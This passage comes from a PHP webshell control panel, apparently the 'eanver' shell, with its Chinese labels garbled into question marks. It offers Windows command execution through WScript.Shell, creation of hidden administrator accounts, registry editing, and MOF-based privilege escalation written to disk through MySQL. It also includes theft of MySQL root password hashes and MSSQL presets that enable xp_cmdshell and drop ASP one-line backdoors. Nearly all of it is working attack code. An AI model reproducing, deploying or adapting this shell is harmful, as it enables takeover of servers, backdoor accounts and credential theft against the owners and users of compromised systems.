<input type="submit" name="runcmd" value="???" style="width:80px;">
<textarea style="width:720px;height:300px;">{$info}</textarea>
</div></center>
</form>
END;
        break;
    case "mysql_exec":
        if (isset($_POST['mhost']) && isset($_POST['mport']) && isset($_POST['muser']) && isset($_POST['mpass'])) {
            if (@mysql_connect($_POST['mhost'] . ':' . $_POST['mport'], $_POST['muser'], $_POST['mpass'])) {
                $cookietime = time() + 24 * 3600;
                setcookie('m_eanverhost', $_POST['mhost'], $cookietime);
                setcookie('m_eanverport', $_POST['mport'], $cookietime);
                setcookie('m_eanveruser', $_POST['muser'], $cookietime);
                setcookie('m_eanverpass', $_POST['mpass'], $cookietime);
                die('??????,?????...<meta http-equiv="refresh" content="0;URL=?eanver=mysql_msg">');
            }
        }
        print <<<END
<form method="POST" name="oform" id="oform">
<div class="actall">??? <input type="text" name="mhost" value="localhost" style="width:300px"></div>
<div class="actall">??? <input type="text" name="mport" value="3306" style="width:300px"></div>
<div class="actall">??? <input type="text" name="muser" value="root" style="width:300px"></div>
<div class="actall">???? <input type="text" name="mpass" value="" style="width:300px"></div>
<div class="actall"><input type="submit" value="???" style="width:80px;"> <input type="button" value="COOKIE" style="width:80px;" onclick="window.location='?eanver=mysql_msg';"></div>
</form>
END;
        break;
    case "winapi":
        //Windows??????
        //function winshell()
        //{
        $nop = '&nbsp;&nbsp;';
        if ($_GET['winshell'] == 'wscript') {
            $wcmd = $_POST['wcmd'] ? $_POST['wcmd'] : 'net user';
            $wcpth = $_POST['wcpth'] ? $_POST['wcpth'] : 'cmd.exe';
            print <<<END
<div class="actall">
<form action="?eanver=winapi&winshell=wscript" method="POST">
<input type="hidden" name="do" id="do" value="do"><br>
{$nop}<input type="text" name="wcmd" id="wcmd" value="{$wcpth}" style="width:300px;"> -> CMD°§??<br />
{$nop}<input type="text" name="wcmd" id="wcmd" value="{$wcmd}" style="width:300px;"> <input type="submit" value="???" style="width:80px;">
<br><br><br></form></div>
END;
            if ($_POST['do'] == 'do') {
                $ww = $wcpth . " /c " . $wcmd;
                $phpwsh = new COM("Wscript.Shell") or die("????Shell.Wscript??????");
                $phpexec = $phpwsh->exec($ww);
                $execoutput = $wshexec->stdout();
                $result = $execoutput->readall();
                echo $result;
                @$phpwsh->Release();
                $phpwsh = NULL;
            }
        } elseif ($_GET['winshell'] == 'shelluser') {
            $wuser = $_POST['wuser'] ? $_POST['wuser'] : 'silic';
            $wpasw = $_POST['wpasw'] ? $_POST['wpasw'] : '1234@silic#';
            print <<<END
<div class="actall">
<form action="?eanver=winapi&winshell=shelluser" method="POST">
<input type="hidden" name="do" id="do" value="do"><br>
Shell.Users???????????<br><br>
{$nop}??????????<input type="text" name="wuser" id="wuser" value="{$wuser}" style="width:100px;"><br>
{$nop}?????????<input type="text" name="wpasw" id="wpasw" value="{$wpasw}" style="width:100px;"><br><br>
<input type="submit" value="????" style="width:80px;">
<br><br><br></form></div>
END;
            if ($_POST['do'] = 'do') {
                $shell = new COM("Shell.Users");
                $cmd = $shell->create($wuser);
                $cmd->changePassword($wpasw, "");
                $cmd->setting["AccountType"] = 3;
            }
        } elseif ($_GET['winshell'] == 'regedit') {
            $shell1 = new COM("wscript.shell") or die("require windows host");
            $action = isset($_POST['action']) ? $_POST['action'] : '';
            echo '<br>';
            echo '<div><h5>???&ß’??&???????</h5><br></div>';
            echo '<br>';
            print <<<END
<TR><form   action=""   method="post">   
<div><TD WIDTH=100 VALIGN=TOP ALIGN=CENTER>   
Rpath:&nbsp<input type="hidden" name="action" value="read">   
<input type="text" name="rpath" value="{$rpath}" size="70">   
<input class="bt" type="submit" value="???"></form></TD></TR><br><br></div>   
END;
            $rpath = isset($_POST['rpath']) ? $_POST['rpath'] : '';
            $rpath = str_replace("\\\\", "\\", $rpath);
            if ($action == "read") {
                $out = $shell1->RegRead($rpath);
                echo '<pre>' . var_dump($out) . '</pre>';
                echo '<br><br>';
            }
            print <<<END
<TR><form   action=""   method="post">   
<div><TD WIDTH=100 VALIGN=TOP ALIGN=CENTER>Wpath:      
<input type="text" name="wpath" value="{$wpath}" size="70"><BR><br> 
Wtype:&nbsp<input type="text" name="wtype" value="{$wtype}" size="20">
Wvalue:&nbsp<input type="text" name="wvalue" value="{$wvalue}" size="30">
<input type="hidden" name="action" value="ß’??">  
<input class="bt" type="submit" value="ß’??"></form></TD></TR><br><br><br></div>   
END;
            $wpath = isset($_POST['wpath']) ? $_POST['wpath'] : '';
            $wpath = str_replace("\\\\", "\\", $wpath);
            $wtype = isset($_POST['wtype']) ? $_POST['wtype'] : '';
            $wvalue = isset($_POST['wvalue']) ? $_POST['wvalue'] : '';
            if ($action == "write") {
                $shell1->RegWrite($wpath, $wvalue, $wtype);
            }
            print <<<END
<TR><form   action=""   method="post">   
<div><TD WIDTH=100 VALIGN=TOP ALIGN=CENTER>  
Dpath:<input type="hidden" name="action" value="del">   
<input type="text" name="dpath" value="{$dpath}" size="70">   
<input class="bt" type="submit" value="???"></form></TD></TR><br><br></div>   
END;
            $dpath = isset($_POST['dpath']) ? $_POST['dpath'] : '';
            $dpath = str_replace("\\\\", "\\", $dpath);
            if ($action == "del") {
                $out = $shell1->RegDelete($dpath);
            }
        } else {
            $tip = "?????????????????????????<br>Webshell??????????????Windows??<br>PHP???????????????????¶≈???????????????<br></h5><br><br><br>";
            print <<<END
<div class="actall"><pre>
<br><a href="?eanver=winapi&winshell=wscript"> [ WScript??? ] </a><br><br>
<h5>?????????PHP????Windows????ß÷?Wscript?????<br>
Wscript?????cmd???????<br>{$tip}<a href="?eanver=winapi&winshell=shelluser"> [ Shell.User??? ] </a><br><br>
<h5>?????????PHP????Windows????ß÷?Shell.user???<br>
USER????Windows???????????????<br>{$tip}<a href="?eanver=winapi&winshell=regedit"> [ ???????? ] </a><br><br>
<h5>?????????PHP????Windows????ß÷?Shell.Wscript???<br>
<h5><font color=red>???????????ß’?????????????</font>
RegRead()?????????????????<br>{$tip}</pre></div>
END;
        }
        //}
        break;
    case "mofshell":
        session_start();
        if (!empty($_POST['submit'])) {
            setcookie("connect");
            setcookie("connect[host]", $_POST['host']);
            setcookie("connect[user]", $_POST['user']);
            setcookie("connect[pass]", $_POST['pass']);
            setcookie("connect[dbname]", $_POST['dbname']);
            setcookie("connect[path]", $_POST['path']);
            echo "<script>location.href='?eanver=mofshell&action=connect'</script>";
        }
        if (empty($_GET["action"])) {
            echo "<form action='?eanver=mofshell&action=connect' method='post'>";
            echo "ip:";
            echo "<div class='actall'><input type='text' name='host' value='localhost:3306'><br/></div>";
            echo "???:";
            echo "<div class='actall'><input type='text' name='user' value='root'><br/></div>";
            echo "????:";
            echo "<div class='actall'><input type='password' name='pass' value='123456'><br/></div>";
            echo "????:";
            echo "<div class='actall'><input type='text' name='dbname' value='mysql'><br/></div>";
            echo "??ß’??(''savefile''???????):";
            echo "<div class='actall'><input type='text' name='path' value='c:/recycler/savefile'><br/></div>";
            echo "<div class='actall'><input type='submit' name='submit' value='??'><br/></div>";
            echo "</form>";
            echo "<div class='actall'>ps:mof?????????windows??????<br>1:mof???????wscript.shell?˝n????????shell.users?????<br>2:????????????????????????????ßπ??<br>3:?????????wscript.shell??shell.user??????<br>4:???????????ßª?????????<br>5:2???????????????ßµ???????????????????????????<br><br>?????????????:<br>";
            echo "\r\n??? net stop winmgmt ??????<br>\r\n??? ???????ßµ?C:\\WINDOWS\\system32\\wbem\\Repository\\<br>\r\n???? net start winmgmt ????????<br>\r\n???????????????????<br>\r\nC:\\WINDOWS\\system32\\wbem\\Repository\\ ???????????????ß÷?.mof????????????????<br>\r\n????????????????????ß≥???<br>\r\n???????????????????????????????????????????mof??????</div>";
            exit;
        }
        if ($_GET[action] == 'connect') {
            $conn = mysql_connect($_COOKIE["connect"]["host"], $_COOKIE["connect"]["user"], $_COOKIE["connect"]["pass"]) or die('<pre>' . mysql_error() . '</pre>');
            echo "<form action='' method='post'>";
            echo "<div class='actall'>Cmd:";
            echo "<input type='text' style='width:400' name='cmd' value='{$strCmd}'?></div>";
            echo "<div class='actall'><input type='submit' value='  wscript???????  '>";
            echo "</form><br><br>";
            echo "<form action='' method='post'>";
            echo "<input type='hidden' name='flag' value='flag'>";
            echo "<input type='submit'value='???wscript??ßﬂ??'></div>";
            echo "</form>";
            echo "<hr>";
            echo "<form action='' method='post'>";
            echo "<input type='hidden' name='shelluser' value='shelluser'>";
            echo "<div class='actall'><input type='submit' value=' shelluser???????  '></div>";
            echo "</form>";
            if (isset($_POST['cmd'])) {
                $strCmd = $_POST['cmd'];
                $cmdshell = 'cmd /c ' . $strCmd . '>' . $_COOKIE["connect"]["path"];
                $mofname = "c:/windows/system32/wbem/mof/system.mof";
                $payload = "#pragma namespace(\"\\\\\\\\\\\\\\\\.\\\\\\\\root\\\\\\\\subscription\")\r\n \r\ninstance of __EventFilter as \$EventFilter\r\n{\r\n  EventNamespace = \"Root\\\\\\\\Cimv2\";\r\n  Name  = \"filtP2\";\r\n  Query = \"Select * From __InstanceModificationEvent \"\r\n      \"Where TargetInstance Isa \\\\\"Win32_LocalTime\\\\\" \"\r\n      \"And TargetInstance.Second = 5\";\r\n  QueryLanguage = \"WQL\";\r\n};\r\n \r\ninstance of ActiveScriptEventConsumer as \$Consumer\r\n{\r\n  Name = \"consPCSV2\";\r\n  ScriptingEngine = \"JScript\";\r\n  ScriptText =\r\n  \"var WSH = new ActiveXObject(\\\\\"WScript.Shell\\\\\")\\\\nWSH.run(\\\\\"{$cmdshell}\\\\\")\";\r\n };\r\n \r\ninstance of __FilterToConsumerBinding\r\n{\r\n  Consumer = \$Consumer;\r\n  Filter = \$EventFilter;\r\n};";
                mysql_select_db($_COOKIE["connect"]["dbname"], $conn);
                $sql1 = "select '{$payload}' into dumpfile '{$mofname}';";
                if (mysql_query($sql1)) {
                    echo "<hr>??????!<br> ????\"???wscript??ßﬂ??\"?????!!<br>?????????ßﬁ??¶±?<br>ps:wscript??????wscript.shell?˝n?????<hr>";
                } else {
                    die(mysql_error());
                }
                mysql_close($conn);
            }
            if (isset($_POST['flag'])) {
                $conn = mysql_connect($_COOKIE["connect"]["host"], $_COOKIE["connect"]["user"], $_COOKIE["connect"]["pass"]) or die('<pre>' . mysql_error() . '</pre>');
                $sql2 = "select load_file(\"" . $_COOKIE["connect"]["path"] . "\");";
                $result2 = mysql_query($sql2);
                $num = mysql_num_rows($result2);
                while ($row = mysql_fetch_array($result2, MYSQL_NUM)) {
                    echo "<hr/>";
                    echo '<pre>' . $row[0] . '</pre>';
                }
                mysql_close($conn);
            }
            if (isset($_POST['shelluser'])) {
                $mofname = "c:/windows/system32/wbem/mof/system.mof";
                $payload = "#pragma namespace(\"\\\\\\\\\\\\\\\\.\\\\\\\\root\\\\\\\\subscription\")\r\n \r\ninstance of __EventFilter as \$EventFilter\r\n{\r\n  EventNamespace = \"Root\\\\\\\\Cimv2\";\r\n  Name  = \"filtP2\";\r\n  Query = \"Select * From __InstanceModificationEvent \"\r\n      \"Where TargetInstance Isa \\\\\"Win32_LocalTime\\\\\" \"\r\n      \"And TargetInstance.Second = 5\";\r\n  QueryLanguage = \"WQL\";\r\n};\r\n \r\ninstance of ActiveScriptEventConsumer as \$Consumer\r\n{\r\n  Name = \"consPCSV2\";\r\n  ScriptingEngine = \"JScript\";\r\n  ScriptText =  \r\n\"var WSH = new ActiveXObject(\\\\\"Shell.Users\\\\\")\\\\nz=WSH.create(\\\\\"MofNewUser\\\\\")\\\\nz.changePassword(\\\\\"ASDfg123!@#...\\\\\", \\\\\"\\\\\")\\\\nz.setting(\\\\\"AccountType\\\\\")=3\";\r\n };\r\n \r\ninstance of __FilterToConsumerBinding\r\n{\r\n  Consumer = \$Consumer;\r\n  Filter = \$EventFilter;\r\n};";
                mysql_select_db($_COOKIE["connect"]["dbname"], $conn);
                $sql1 = "select '{$payload}' into dumpfile '{$mofname}';";
                if (mysql_query($sql1)) {
                    echo "<hr>??????????,?????MofNewUser ????ASDfg123!@#...    <br>ps:ShellUser????????????,??5????????ß”????<hr>";
                } else {
                    die(mysql_error());
                }
                mysql_close($conn);
            }
        }
        break;
    case "readpass":
        if (isset($_POST['sub'])) {
            $name = $_POST['name'];
            $pass = $_POST['password'];
            $host = $_POST['host'];
            $db = $_POST['db'];
            $link = mysql_connect($host, $name, $pass);
            if (!link) {
                die("could not connect" . mysql_error());
            }
            if (!mysql_select_db($db, $link)) {
                die("db" . mysql_error());
            }
            $db_path_sql = "select @@basedir";
            if ($n = mysql_query($db_path_sql)) {
                $db_path_rs = mysql_fetch_array($n);
                $db_path = str_replace("\\", "/", $db_path_rs[0]);
            }
            $dropmoon = 'DROP table moon';
            $sql = "CREATE TABLE moon (`code` TEXT NOT NULL ) ENGINE = MYISAM CHARACTER SET utf8 COLLATE utf8_general_ci;";
            $exp = "LOAD DATA LOCAL INFILE '" . $db_path . "data/mysql/user.MYD' INTO TABLE moon fields terminated by '' LINES TERMINATED BY '\0';";
            $select = "SELECT code FROM moon";
            $pass = "";
            mysql_query($dropmoon);
            if (mysql_query($sql)) {
                if ($row = mysql_query($exp)) {
                    if ($row = mysql_query($select)) {
                        while ($rows = mysql_fetch_array($row)) {
                            echo $pass .= $rows['code'];
                        }
                    }
                }
            }
        } else {
            echo '<form action="" method="post">';
            echo "<h3>MYSQL???????ROOT??????</h3>";
            echo '<div class="actall">ip??&nbsp;&nbsp;&nbsp;<input type="text" name="host" value="localhost"><br></div>';
            echo '<div class="actall">?????<input type="text" name="name" value="root"><br></div>';
            echo '<div class="actall">????<input type="text" name="password"><br></div>';
            echo '<div class="actall">??????<input type="text" name="db" value="mysql"></div>';
            echo '<div class="actall">&nbsp&nbsp<input type="submit" value="    ???    " name="sub"></div>';
        }
        break;
    case "othersql":
        //?????????????
        //function otherdb(){
        $db = isset($_GET['db']) ? $_GET['db'] : 'ms';
        print <<<END
<form method="POST" name="dbform" id="dbform" action="?eanver=othersql&db={$db}" enctype="multipart/form-data">
<div class="actall">
<a href="?eanver=othersql&db=ms"> &nbsp; MSSQL &nbsp;</a>
<a href="?eanver=othersql&db=ora"> &nbsp; Oracle &nbsp;</a>
<a href="?eanver=othersql&db=ifx"> &nbsp; InforMix &nbsp;</a>
<a href="?eanver=othersql&db=fb"> &nbsp; FireBird &nbsp;</a>
<a href="?eanver=othersql&db=db2">&nbsp; DB2 &nbsp;</a></div></form>
END;
        if ($db == "ms") {
            $mshost = isset($_POST['mshost']) ? $_POST['mshost'] : 'localhost';
            $msuser = isset($_POST['msuser']) ? $_POST['msuser'] : 'sa';
            $mspass = isset($_POST['mspass']) ? $_POST['mspass'] : '';
            $msdbname = isset($_POST['msdbname']) ? $_POST['msdbname'] : 'master';
            $msaction = isset($_POST['action']) ? $_POST['action'] : '';
            $msquery = isset($_POST['mssql']) ? $_POST['mssql'] : '';
            $msquery = stripslashes($msquery);
            print <<<END
<div class="actall">
<form method="POST" name="msform" action="?eanver=othersql&db=ms">
??????<input type="text" name="mshost" value="{$mshost}" style="width:100px">
???:<input type="text" name="msuser" value="{$msuser}" style="width:100px">
????:<input type="text" name="mspass" value="{$mspass}" style="width:100px">
????:<input type="text" name="msdbname" value="{$msdbname}" style="width:100px"><br>
<script language="javascript">
function msFull(i){
Str = new Array(11);
Str[0] = "";
Str[1] = "select @@version;";
Str[2] = "select name from sysdatabases;";
Str[3] = "select name from sysobject where type='U';";
Str[4] = "select name from syscolumns where id=Object_Id('table_name');";
Str[5] = "Use master dbcc addextendedproc ('sp_OACreate','odsole70.dll');";
Str[6] = "Use master dbcc addextendedproc ('xp_cmdshell','xplog70.dll');";
Str[7] = "EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;";
Str[8] = "exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ole Automation Procedures',1;RECONFIGURE;";
Str[9] = "exec sp_configure 'show advanced options', 1;RECONFIGURE;exec sp_configure 'Ad Hoc Distributed Queries',1;RECONFIGURE;";
Str[10] = "Exec master.dbo.xp_cmdshell 'net user';";
Str[11] = "Declare @s int;exec sp_oacreate 'wscript.shell',@s out;Exec SP_OAMethod @s,'run',NULL,'cmd.exe /c echo ^<%execute(request(char(35)))%^> > c:\\\\1.asp';";
Str[12] = "sp_makewebtask @outputfile='d:\\\\web\\\\bin.asp',@charset=gb2312,@query='select ''<%execute(request(chr(35)))%>''' ";
msform.mssql.value = Str[i];
return true;
}
</script>
<textarea name="mssql" style="width:600px;height:200px;">{$msquery}</textarea><br>
<select onchange="return msFull(options[selectedIndex].value)">
<option value="0" selected>???????</option>
<option value="1">????∑⁄</option>
<option value="2">?????</option>
<option value="3">????</option>
<option value="4">???</option>
<option value="5">sp_oacreate</option>
<option value="6">xp_cmdshell</option>
<option value="7">xp_cmdshell(2005)</option>
<option value="8">sp_oacreate(2005)</option>
<option value="9">??openrowset(2005)</option>
<option value="10">xp_cmdshell exec</option>
<option value="10">sp_oamethod exec</option>
<option value="11">sp_makewebtask</option>
</select>
<input type="hidden" name="action" value="msquery">
<input class="bt" type="submit" value="???"></form></div>
END;
            if ($msaction == 'msquery') {
                $msconn = mssql_connect($mshost, $msuser, $mspass);
                mssql_select_db($msdbname, $msconn) or die("connect error :" . mssql_get_last_message());
                $msresult = mssql_query($msquery) or die(mssql_get_last_message());
                echo '<font face="verdana"><table border="1" cellpadding="1" cellspacing="2">' . "\n<tr>\n";
                for ($i = 0; $i < mssql_num_fields($msresult); $i++) {
                    echo '<td><b>' . mssql_field_name($msresult, $i) . "</b></td>\n";
                }
                echo "</tr>\n";
                mssql_data_seek($result, 0);
                while ($msrow = mssql_fetch_row($msresult)) {
                    echo "<tr>\n";
                    for ($i = 0; $i < mssql_num_fields($msresult); $i++) {
                        echo '<td>' . "{$msrow[$i]}" . '</td>';
                    }
                    echo "</tr>\n";
                }
                echo "</table></font>";
                mssql_free_result($msresult);
                mssql_close();
            }
        } elseif ($db == "ora") {
            $orahost = isset($_POST['orahost']) ? $_POST['orahost'] : 'localhost';
            $oraport = isset($_POST['oraport']) ? $_POST['oraport'] : '1521';
            $orauser = isset($_POST['orauser']) ? $_POST['orauser'] : 'root';
            $orapass = isset($_POST['orapass']) ? $_POST['orapass'] : '123456';
            $orasid = isset($_POST['orasid']) ? $_POST['orasid'] : 'ORCL';
            $oraaction = isset($_POST['action']) ? $_POST['action'] : '';
            $oraquery = isset($_POST['orasql']) ? $_POST['orasql'] : '';
            $oraquery = stripslashes($oraquery);
            print <<<END
<form method="POST" name="oraform" action="?eanver=othersql&db=ora">
<div class="actall">
????:<input type="text" name="orahost" value="{$orahost}" style="width:100px">
???:<input type="text" name="oraport" value="{$oraport}" style="width:50px">
???:<input type="text" name="orauser" value="{$orauser}" style="width:80px">
????:<input type="text" name="orapass" value="{$orapass}" style="width:100px">
SID:<input type="text" name="orasid" value="{$orasid}" style="width:50px"><br>
<script language="javascript">
function oraFull(i){
Str = new Array(5);
Str[0] = "";
Str[1] = "select version();";
Str[2] = "SELECT NAME FROM V{$DATABASE}";
Str[3] = "select * From all_objects where object_type='TABLE'";
Str[4] = "select column_name from user_tab_columns where table_name='table1'";
oraform.orasql.value = Str[i];
return true;
}
</script>
<textarea name="orasql" style="width:600px;height:200px;">{$oraquery}</textarea><br>
<select onchange="return oraFull(options[selectedIndex].value)">
<option value="0" selected>???????</option>
<option value="1">????∑⁄</option>
<option value="2">?????</option>
<option value="3">????</option>
<option value="4">???</option>
</select>
<input type="hidden" name="action" value="myquery">
<input class="bt" type="submit" value="Query"></div></form>
END;
            if ($oraaction == 'oraquery') {
                $oralink = OCILogon($orauser, $orapass, "(DEscriptION=(ADDRESS=(PROTOCOL =TCP)(HOST={$orahost})(PORT = {$oraport}))(CONNECT_DATA =(SID={$orasid})))") or die(ocierror());
                $oraresult = ociparse($oralink, $oraquery) or die(ocierror());
                $orarow = oci_fetch_row($oraresult);
                echo '<font face="verdana"><table border="1" cellpadding="1" cellspacing="2">' . "\n<tr>\n";
                for ($i = 0; $i < oci_num_fields($oraresult); $i++) {
                    echo '<td><b>' . oci_field_name($oraresult, $i) . "</b></td>\n";
                }
                echo "</tr>\n";
                ociresult($oraresult, 0);
                while ($orarow = ora_fetch_row($oraresult)) {
                    echo "<tr>\n";
                    for ($i = 0; $i < ora_num_fields($result); $i++) {
                        echo '<td>' . "{$orarow[$i]}" . '</td>';
                    }
                    echo "</tr>\n";
                }
                echo "</table></font>";
                oci_free_statement($oraresult);
                ocilogoff();
            }
        } elseif ($db == "ifx") {
            $ifxuser = isset($_POST['ifxuser']) ? $_POST['ifxuser'] : 'root';
            $ifxpass = isset($_POST['ifxpass']) ? $_POST['ifxpass'] : '123456';
            $ifxdbname = isset($_POST['ifxdbname']) ? $_POST['ifxdbname'] : 'ifxdb';
            $ifxaction = isset($_POST['action']) ? $_POST['action'] : '';
            $ifxquery = isset($_POST['ifxsql']) ? $_POST['ifxsql'] : '';
            $ifxquery = stripslashes($ifxquery);
            print <<<END
<form method="POST" name="ifxform" action="?eanver=othersql&db=ifx">
<div class="actall">????:<input type="text" name="ifxhost" value="{$ifxdbname}" style="width:100px">
???:<input type="text" name="ifxuser" value="{$ifxuser}" style="width:100px">
????:<input type="text" name="ifxpass" value="{$ifxpass}" style="width:100px"><br>
<script language="javascript">
function ifxFull(i){
Str = new Array(11);
Str[0] = "";
Str[1] = "select dbservername from sysobjects;";
Str[2] = "select name from sysdatabases;";
Str[3] = "select tabname from systables;";
Str[4] = "select colname from syscolumns where tabid=n;";
Str[5] = "select username,usertype,password from sysusers;";
ifxform.ifxsql.value = Str[i];
return true;
}
</script>
<textarea name="ifxsql" style="width:600px;height:200px;">{$ifxquery}</textarea><br>
<select onchange="return ifxFull(options[selectedIndex].value)">
<option value="0" selected>???????</option>
<option value="1">??????????????</option>
<option value="1">?????</option>
<option value="2">????</option>
<option value="3">???</option>
<option value="4">hashes</option>
</select>
<input type="hidden" name="action" value="ifxquery">
<input class="bt" type="submit" value="Query"></div></form>
END;
            if ($ifxaction == 'ifxquery') {
                $ifxlink = ifx_connect($ifcdbname, $ifxuser, $ifxpass) or die(ifx_errormsg());
                $ifxresult = ifx_query($ifxquery, $ifxlink) or die(ifx_errormsg());
                $ifxrow = ifx_fetch_row($ifxresult);
                echo '<font face="verdana"><table border="1" cellpadding="1" cellspacing="2">' . "\n<tr>\n";
                for ($i = 0; $i < ifx_num_fields($ifxresult); $i++) {
                    echo '<td><b>' . ifx_fieldproperties($ifxresult) . "</b></td>\n";
                }
                echo "</tr>\n";
                mysql_data_seek($ifxresult, 0);
                while ($ifxrow = ifx_fetch_row($ifxresult)) {
                    echo "<tr>\n";
                    for ($i = 0; $i < ifx_num_fields($ifxresult); $i++) {
                        echo '<td>' . "{$ifxrow[$i]}" . '</td>';
                    }
                    echo "</tr>\n";
                }
                echo "</table></font>";
                ifx_free_result($ifxresult);
                ifx_close();
            }
        } elseif ($db == "db2") {
            $db2host = isset($_POST['db2host']) ? $_POST['db2host'] : 'localhost';
            $db2port = isset($_POST['db2port']) ? $_POST['db2port'] : '50000';
            $db2user = isset($_POST['db2user']) ? $_POST['db2user'] : 'root';
            $db2pass = isset($_POST['db2pass']) ? $_POST['db2pass'] : '123456';
            $db2dbname = isset($_POST['db2dbname']) ? $_POST['db2dbname'] : 'mysql';
            $db2action = isset($_POST['action']) ? $_POST['action'] : '';
            $db2query = isset($_POST['db2sql']) ? $_POST['db2sql'] : '';
            $db2query = stripslashes($db2query);
            print <<<END
<form method="POST" name="db2form" action="?eanver=othersql&db=db2">
<div class="actall">????:<input type="text" name="db2host" value="{$db2host}" style="width:100px">
???:<input type="text" name="db2port" value="{$db2port}" style="width:60px">
???:<input type="text" name="db2user" value="{$db2user}" style="width:100px">
????:<input type="text" name="db2pass" value="{$db2pass}" style="width:100px">
????:<input type="text" name="db2dbname" value="{$db2dbname}" style="width:100px"><br>
<script language="javascript">
function db2Full(i){
Str = new Array(4);
Str[0] = "";
Str[1] = "select schemaname from syscat.schemata;";
Str[2] = "select name from sysibm.systables;";
Str[3] = "select colname from syscat.columns where tabname='table_name';";
Str[4] = "db2 get db cfg for db_name;";
db2form.db2sql.value = Str[i];
return true;
}
</script>

<textarea name="db2sql" style="width:600px;height:200px;">{$db2query}</textarea><br>
<select onchange="return db2Full(options[selectedIndex].value)">
<option value="0" selected>???????</option>
<option value="1">?????</option>
<option value="1">????</option>
<option value="2">???</option>
<option value="3">?????????</option>
</select>
<input type="hidden" name="action" value="db2query">
<input class="bt" type="submit" value="Query"></div></form>
END;
            if ($myaction == 'db2query') {
                $db2link = db2_connect($db2dbname, $db2user, $db2pass) or die(db2_conn_errormsg());
                $db2result = db2_exec($db2link, $db2query) or die(db2_stmt_errormsg());
                $db2row = db2_fetch_row($db2result);
                echo '<font face="verdana"><table border="1" cellpadding="1" cellspacing="2">' . "\n<tr>\n";
                for ($i = 0; $i < db2_num_fields($db2result); $i++) {
                    echo '<td><b>' . db2_field_name($db2result) . "</b></td>\n";
                }
                echo "</tr>\n";
                while ($db2row = db2_fetch_row($db2result)) {
                    echo "<tr>\n";
                    for ($i = 0; $i < db2_num_fields($db2result); $i++) {
                        echo '<td>' . "{$db2row[$i]}" . '</td>';
                    }
                    echo "</tr>\n";
                }
                echo "</table></font>";
                db2_free_result($db2result);
                db2_close();
            }
        } elseif ($db == "fb") {
            $fbhost = isset($_POST['fbhost']) ? $_POST['fbhost'] : 'localhost';
            $fbpath = isset($_POST['fbpath']) ? $_POST['fbpath'] : '';
            $fbpath = str_replace("\\\\", "\\", $fbpath);
            $fbuser = isset($_POST['fbuser']) ? $_POST['fbuser'] : 'sysdba';
            $fbpass = isset($_POST['fbpass']) ? $_POST['fbpass'] : 'masterkey';
            $fbaction = isset($_POST['action']) ? $_POST['action'] : '';
            $fbquery = isset($_POST['fbsql']) ? $_POST['fbsql'] : '';
            $fbquery = stripslashes($fbquery);
            print <<<END
<form method="POST" name="fbform" action="?eanver=othersql&db=fb">
<div class="actall">????:<input type="text" name="fbhost" value="{$fbhost}" style="width:100px">
???:<input type="text" name="fbpath" value="{$fbpath}" style="width:100px">
???:<input type="text" name="fbuser" value="{$fbuser}" style="width:100px">
????:<input type="text" name="fbpass" value="{$fbpass}" style="width:100px"><br/>
<script language="javascript">
function fbFull(i){
Str = new Array(5);
Str[0] = "";
Str[1] = "select RDB\$RELATION_NAME from RDB\$RELATIONS;";
Str[2] = "select RDB\$FIELD_NAME from RDB\$RELATION_FIELDS where RDB\$RELATION_NAME='table_name';";
Str[3] = "input 'D:\\createtable.sql';";
Str[4] = "shell netstat -an;";
fbform.fbsql.value = Str[i];
return true;
}
</script>
<textarea name="fbsql" style="width:600px;height:200px;">{$fbquery}</textarea><br>
<select onchange="return fbFull(options[selectedIndex].value)">
<option value="0" selected>???????</option>
<option value="1">????</option>
<option value="2">???</option>
<option value="3">????sql</option>
<option value="4">shell</option>
</select>
<input type="hidden" name="action" value="fbquery">
<input class="bt" type="submit" value="Query"></div></form>
END;
            if ($fbaction == 'fbquery') {
                $fblink = ibase_connect($fbhost . ':' . $fbpath, $fbuser, $fbpass) or die(ibase_errmsg());
                $fbresult = ibase_query($fblink, $fbquery) or die(ibase_errmsg());
                echo '<font face="verdana"><table border="1" cellpadding="1" cellspacing="2">' . "\n<tr>\n";
                for ($i = 0; $i < ibase_num_fields($fbresult); $i++) {
                    echo '<td><b>' . ibase_field_info($fbresult, $i) . "</b></td>\n";
                }
                echo "</tr>\n";
                ibase_field_info($fbresult, 0);
                while ($fbrow = ibase_fetch_row($fbresult)) {
                    echo "<tr>\n";
                    for ($i = 0; $i < ibase_num_fields($fbresult); $i++) {
                        echo '<td>' . "{$fbrow[$i]}" . '</td>';
                    }
                    echo "</tr>\n";
                }
                echo "</table></font>";
                ibase_free_result($fbresult);
                ibase_close();
            }
        }
        //}
        break;
    case "zippak":
        //function zipact()
        //{
        $zfile = $_POST['zfile'] ? $_POST['zfile'] : 'php.zip';
        $jypt = $_POST['jypt'] ? $_POST['jypt'] : './';
        $tip = "¶ƒ??????";
        if ($_POST['zip'] == 'zip') {
            if (function_exists(zip_open)) {
                $zfile = key_exists('zip', $_GET) && $_GET['zip'] ? $_GET['zip'] : $zfile;
                $zfile = str_replace(array(dirname(__FILE__) . "/", dirname(__FILE__) . "\\"), array("", ""), $zfile);
                $zpath = str_replace('\\', '/', dirname(__FILE__)) . '/' . $zfile;
                if (!is_file($zpath)) {
                    $tip = '???"' . $zpath . '"??????!';
                } else {
                    $zip = new ZipArchive();
                    $rs = $zip->open($zpath);
                    if ($rs !== TRUE) {
                        $tip = '??????:' . $rs;
                    }
                    $zip->extractTo($jypt);
                    $zip->close();
                    $tip = $zfile . '??????!';
                }
            } else {
                $tip = "???????????PHP_ZIP???,?????";
            }
        }
        print <<<END
<div class="actall">
<form action="?eanver=info_f" method="POST">
<input type="hidden" name="zip" id="zip" value="zip">
????????PHP??zip_open?????????ZIP??????<br>
?????????<b><a href="??eanver=info_f">?????</a></b>????????????php_zip<br>
??????°§????ß’???????????°§????????????????¶ƒ???? :-(<br>
??????°§????ß’<br><br>
??????°§????<br>
<input type="text" name="zfile" id="zfile" value="{$zfile}" style="width:720px;"><br><br>
???°§????
<input type="text" name="jypt" id="jypt" value="{$jypt}" style="width:720px;"><br><br>
<input type="submit" value="??????" style="width:80px;"><br><br><br>
{$tip}<br><br><br></form></div>
END;
        //}
        break;
    case "mysql_msg":
        $conn = @mysql_connect($_COOKIE['m_eanverhost'] . ':' . $_COOKIE['m_eanverport'], $_COOKIE['m_eanveruser'], $_COOKIE['m_eanverpass']);
        if ($conn) {
            print <<<END
<script language="javascript">
function Delok(msg,gourl)
{
\tsmsg = "???????[" + unescape(msg) + "]???";
